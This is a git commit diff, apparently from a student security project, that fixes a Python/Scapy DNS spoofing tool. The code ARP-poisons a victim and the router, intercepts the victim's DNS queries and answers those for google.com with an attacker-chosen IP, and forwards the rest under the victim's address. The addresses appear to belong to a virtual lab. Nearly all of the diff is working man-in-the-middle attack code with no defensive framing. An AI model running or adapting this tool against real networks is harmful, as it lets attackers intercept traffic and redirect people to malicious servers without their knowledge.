233001e949a2d12262ab5b477e79c8c82644314e
woutheijne <w.h.m.heijne@student.tue.nl>
2025-07-21 20:35:47 +0200

    Fixed dns functionality

--- dns.py
+++ dns.py
@@ -32,36 +32,47 @@ def send_dns_spoof_packet(packet, domain, spoofed_ip):
 
 def handle_packet(packet, domain, spoofed_ip, victim_ip, router_ip):
     if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
-        query_domain = packet.getlayer(DNS).qd.qname.decode('utf-8')
-        print("DNS query received from %s: %s" % (packet[IP].src, query_domain))
+        query_domain = packet.getlayer(DNS).qd.qname.decode('utf-8').rstrip('.')
+        print("DNS query received from %s for %s" % (packet[IP].src, query_domain))
 
         if query_domain == domain:
             print("Spoofing %s to %s" % (domain, spoofed_ip))
-            send_dns_spoof_packet(packet)
+            send_dns_spoof_packet(packet, domain, spoofed_ip)
         else:
+            packet[IP].dst = "1.1.1.1"
+            del packet[Ether].dst
+            packet[IP].src = victim_ip
+            packet.show()
             print("non spoofed DNS query for %s. forwarding to %s" % (query_domain, packet[IP].dst))
             send(packet, verbose=False)
+    elif packet.haslayer(DNS) and packet.getlayer(DNS).qr == 1:
+        print("Received DNS response from %s to %s" % (packet[IP].src, packet[IP].src))
     else:
         if packet.haslayer(IP):
+            print("Received non dns packet, forwarfing") 
             if packet[IP].src == victim_ip:
                 send(packet, verbose=False)
             elif packet[IP].src == router_ip:
                 send(packet, verbose=False)
                 
 def spoof(interface, domain, victim_ip, spoofed_ip):
+    print("Starting a DNS spoof for victim %s, pretending %s is at %s" % (victim_ip, domain, spoofed_ip))
     try:
         set_ip_forwarding(True)
-        arp_thread = arp.two_way_arp_spoof(victim_ip, spoofed_ip, 2)
         router_ip = conf.route.route("0.0.0.0")[2]
+        print("Router ip: %s" % router_ip)
+        arp1 = arp()
+        arp1.two_way_arp_spoof(victim_ip, router_ip, 2, interface)
         sniff(filter="udp and port 53", prn=lambda pkt: handle_packet(pkt, domain, spoofed_ip, victim_ip, router_ip), store=0, iface=interface)
     except KeyboardInterrupt:
         print("stopping DNS spoof")
     except Exception as e:
         print("An error occurred: %s" % e)
     finally:
-        arp.stop_two_way_spoof()
-        if arp_thread.is_alive():
-            arp_thread.join(timeout=5)
-            
-            set_ip_forwarding(False)
-            print("DNS spoofing stopped")
+        arp1.stop_two_way_spoof()
+        set_ip_forwarding(False)
+        print("DNS spoofing stopped")
+        
+        
+        
+        
--- main.py
+++ main.py
@@ -1,16 +1,8 @@
 from arp import *
-import dns
+from dns import *
 
-TARGET_IP = "192.168.56.101"
-SPOOFED_IP = "192.168.56.102"
-IFACE = "enp0s3"
+TARGET_IP = "10.0.2.5"
+SPOOFED_IP = "10.0.2.4"
+IFACE = "enp0s8"
 
-arp1 = arp()
-
-arp1.two_way_arp_spoof(TARGET_IP, SPOOFED_IP, 2, IFACE)
-
-try:
-    time.sleep(10)
-except KeyboardInterrupt:
-    pass
-arp1.stop_two_way_spoof()
+spoof(IFACE, "google.com", TARGET_IP, SPOOFED_IP)
